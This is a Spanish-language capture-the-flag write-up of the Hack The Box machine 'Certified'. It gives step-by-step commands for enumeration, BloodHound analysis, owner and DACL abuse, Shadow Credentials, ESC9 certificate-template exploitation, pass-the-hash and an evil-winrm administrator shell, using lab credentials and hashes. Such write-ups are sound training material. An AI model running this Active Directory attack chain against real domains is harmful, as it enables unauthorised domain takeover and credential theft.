---
title: "Certified"
date: "2025-03-16T00:04:43-05:00"
type: "maquinas"
draft: false
tags: ["BloodHund", "ESC9", "shadow-credentials", "impacket", "netexec"]
---

## Descripción: 
Maquina en la cual con las credenciales que nos proporcionan hacemos uso de bloodhund para poder cambiar de usuario usando la tecnica Shadow Credentials, para luego mediate de una herramienta encontrar la vulnerabilidad ESC9 y poder elevar privilegios.

# Enumeración

```jsx
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.41 -oG allPorts
```

<a href="https://imgur.com/At3Gt4r"><img src="https://i.imgur.com/At3Gt4r.png" title="source: imgur.com" /></a>

```jsx
nmap -sCV -p53,88,135,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49681,49714,49719,49770 10.10.11.41 -oN target
```

<a href="https://imgur.com/s61BBao"><img src="https://i.imgur.com/s61BBao.png" title="source: imgur.com" /></a>

Vamos a usar las credenciales que nos provee hack the box judith.mader / judith09, vamos a listar tanto servicios compartidos como usuarios con los dos siguientes comandos.

```jsx
xc smb 10.10.11.41 -d certified.htb -u judith.mader -p judith09 --shares
```

```jsx
nxc smb 10.10.11.41 -u judith.mader -p 'judith09' --users
```

<a href="https://imgur.com/t7YGMxl"><img src="https://i.imgur.com/t7YGMxl.png" title="source: imgur.com" /></a>

Vamos a listar las configuraciones y los protocolos que se le aplican a la maquina con el comando:

```jsx
nxc smb 10.10.11.41 -u judith.mader -p 'judith09' --pass-pol
```

<a href="https://imgur.com/cMpoOaB"><img src="https://i.imgur.com/cMpoOaB.png" title="source: imgur.com" /></a>

La enumeración de la política de contraseñas muestra que la longitud mínima de la contraseña es de 7 caracteres, la complejidad de la contraseña está desactivada (esto significa que los usuarios pueden elegir contraseñas cortas y débiles) y, lo más importante, la opción Account Lockout Threshold, lo que significa que podemos forzar la cuenta sin temer que se quede bloqueada. 

Ya con esto queremos saber que grupos y usuarios hay creados por lo que vamos a usar ldapdomaindump para que nos muestre esto.

```jsx
ldapdomaindump -u 'certified.htb\judith.mader' -p 'judith09' 10.10.11.41
```

<a href="https://imgur.com/qqKXBJ9"><img src="https://i.imgur.com/qqKXBJ9.png" title="source: imgur.com" /></a>

# Bloodhund

Vamos a usar una herramienta llamada bloodhund que nos va a ayudar encontrar vulnerabilidades para saltar de un usuario a otro y hacer finalmente el escalamiento de privilegios. Para instalarlo y configurarlo seguir este paso a paso https://www.kali.org/tools/bloodhound/.

```jsx
bloodhound-python -u 'judith.mader' -p 'judith09' -ns 10.10.11.41 -d certified.htb -c all
```

Despues de subir los archivos que nos genero el comando y buscar al usuario al cual tenemos acceso podemos ver que en Outbound Object Control tenemos la opción de saltar a otro usuario en este caso “management_scv**@**certified.htb**”.** 

<a href="https://imgur.com/3wMqZ0m"><img src="https://i.imgur.com/3wMqZ0m.png" title="source: imgur.com" /></a>

<a href="https://imgur.com/ZpnCq4S"><img src="https://i.imgur.com/ZpnCq4S.png" title="source: imgur.com" /></a>

Ahora lo que vamos a hacer es seguir lo que nos dice bloodhund, descargamos los siguientes scripts:

- https://github.com/fortra/impacket/blob/master/examples/dacledit.py
- https://github.com/fortra/impacket/blob/master/examples/owneredit.py
- https://github.com/ShutdownRepo/pywhisker/blob/main/pywhisker/pywhisker.py

```jsx
python3 owneredit.py -action write -new-owner judith.mader -target management certified.htb/judith.mader:judith09
python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management certified.htb/judith.mader:judith09
net rpc group addmem management management -U certified.htb/judith.mader%judith09 -S certified.htb
pth-net rpc group addmem management judith.mader -U certified.htb/judith.mader%37937096CA6E6E2209752A3293831D17:8EC62AC86259004C121A7DF4243A7A80 -S certified.htb
```

Despues de esto lo que hemos hecho es agregar a judith al grupo management y ahora podemos modificar ls atributos de management_svc para verificar que todo se ha hecho ejecutamos el comando a continuacion.

```jsx
net rpc group members management -U certified.htb/judith.mader%judith09 -S certified.htb
```

<a href="https://imgur.com/tYORAxa"><img src="https://i.imgur.com/tYORAxa.png" title="source: imgur.com" /></a>

Ahora para aplicar el ataque de shadow credentials vamos a usar una herramienta llamada certipy la cual vamos a instalar en un entorno virtual de python.

```python
python3 -m venv env
source env/bin/activate
pip3 install certipy-ad
```

Si bien podriamos mandar el comando de certipy solamente es my probable que tengamos un error debido a que nuestra hora es diferente al de la maquina por lo que tambien vamos a usar faketime de la siguiente manera:

```python
faketime "$(ntpdate -q certified.htb | cut -d ' ' -f 1,2)" certipy shadow auto -username judith.mader@certified.htb -p judith09 -account management_svc
```

<a href="https://imgur.com/5voHu48"><img src="https://i.imgur.com/5voHu48.png" title="source: imgur.com" /></a>

Ahora desde bloodhund podemos ver que podemos cambiar hacia el usuario ca_operator con un GenericAll por lo que vamos a seguir lo que nos dice.

<a href="https://imgur.com/rLTmwqO"><img src="https://i.imgur.com/rLTmwqO.png" title="source: imgur.com" /></a>

```python
pth-net rpc password ca_operator "nueva contraseña" -U certified.htb/management_svc%ffffffffffffffffffffffffffffffff:a091c1832bcdd4677c28b5a6a1295584 -S certified.htb
```

Con esto le hemos cambiado la contraseña a el usuario ca_operator ahora vamos a tratar de encontrar alguna otra vulnerabilidad usando certipy de nuevo.

```python
certipy find -dc-ip 10.10.11.41 -u ca_operator -p "nueva contraseña"
```

Abriendo el txt que nos deja este comando en la parte de certipy templates podemos ver una vulnerabilidad ESC9

<a href="https://imgur.com/n6xKWXY"><img src="https://i.imgur.com/n6xKWXY.png" title="source: imgur.com" /></a>

Vamo a irnos a esta pagina para que nos de el hash de la contraseña que le asignamos https://www.browserling.com/tools/ntlm-hash y luego vamos a ejecutar los siguientes comandos para explotar el ESC9

```python
certipy account update -username management_svc@certified.htb -hashes "hash management_svc" -user ca_operator -upn administrator
certipy req -username ca_operator@certified.htb -hashes "hash nueva contraseña" -ca certified-DC01-CA -template CertifiedAuthentication -debug
```

<a href="https://imgur.com/3NheBlO"><img src="https://i.imgur.com/3NheBlO.png" title="source: imgur.com" /></a>

Revertimos lo que hemos hecho con el usuario ca_operator para que cuando busqeumos el hash de administrator lo halle:

```python
certipy account update -username management_svc@certified.htb -hashes "hash management_svc" -user ca_operator -upn ca_operator@certified.htb
```

Y finalmente buscamos el hash del administrator con el siguiente comando teniendo en cuenta los problemas de hora que puede tener la maquina.

```python
certipy auth -pfx administrator.pfx -domain certified.htb
```

<a href="https://imgur.com/0UNBYmi"><img src="https://i.imgur.com/0UNBYmi.png" title="source: imgur.com" /></a>

Finalmente con el hash del administrator vamos a conseguir una shell y ya podremos encontrar las dos flags:

```python
evil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```
